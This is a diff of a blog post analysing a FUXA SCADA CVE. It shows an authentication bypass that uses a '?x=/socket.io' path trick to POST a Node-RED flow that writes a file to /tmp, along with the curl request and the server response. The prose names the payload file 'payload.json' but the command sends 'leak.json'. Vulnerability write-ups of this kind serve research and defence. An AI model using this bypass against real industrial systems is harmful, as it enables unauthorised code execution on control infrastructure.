@@ -34,12 +34,7 @@ the Node-RED but the *connector*, the part which makes it possible for FUXA to i
 FUXA has monolithic architecture, a client and a server run as a single process and accessed through a single port. Although the
 code component is modular (client and server are different component), it is deployed as a single unit.
 
-<figure>
-  <img src="/images/analyzing-scada-software-cve/fuxa-client-server-architecture.png" 
-       alt=""
-  >
-  <figcaption>Figure 1. Simplified Fuxa Client Server Architecture</figcaption>
-</figure>
+![Simplified FUXA client-server architecture](/images/analyzing-scada-software-cve/fuxa-client-server-architecture.png "Figure 1. Simplified Fuxa Client Server Architecture")
 
 The architecture shown on Figure 1 is trimmed down version of FUXA application architecture. FUXA doesn't just support Node-RED
 but also Siemens S7, and other standard industrial protocols. We're focusing on Node-RED since the CVE is related to this
@@ -112,12 +107,12 @@ Keep-Alive: timeout=5
 ```
 
 Well, look at that. We got HTTP 400 now, it doesn't complain about the authentication but missing payload. The exception error
-gives us clue it was failing to iterate an array. We can consult the Node-RED documentation about the payload here. Since this
-endpoint is used to set a flow, we are going to build one through API. Let's try to create a flow that executes a code to write
-a new file. This file will be written in the server machine where FUXA is running, in other words, in the container. So let's
-write it to `/tmp` directory as POC. Here's the payload:
+gives us clue it was failing to iterate an array. Since this endpoint is used to set a flow, we are going to build one
+through API. Let's try to create a flow that executes a code to write a new file. This file will be written in the server
+machine where FUXA is running, in other words, in the container. So let's write it to `/tmp` directory as POC. Here's the
+payload:
 
-```
+```json
 [
     {
         "id": "tab-lab",
@@ -153,3 +148,21 @@ write it to `/tmp` directory as POC. Here's the payload:
     }
 ]
 ```
+
+Save it in a file **payload.json**, then send the payload in the POST request. This is the response:
+
+```
+> curl -iX POST --json @leak.json localhost:1881/nodered/flows?x=/socket.io
+HTTP/1.1 204 No Content
+X-Powered-By: Express
+Access-Control-Allow-Methods: GET,PUT,POST,DELETE,OPTIONS
+Access-Control-Allow-Headers: x-access-token, x-auth-user, Origin, Content-Type, Accept
+Access-Control-Allow-Origin: *
+Date: Wed, 25 Nov 2026 04:21:47 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+```
+
+Well, well, well. Looks like something just happened. How can we check if a flow is created? Let's look at http://localhost:1881/flows
+
+![Flow created after the path-manipulation bypass](/images/analyzing-scada-software-cve/created-flow-after-path-manipulation.png "Figure 2. Created Flow After Bypassing Through Path Manipulation")
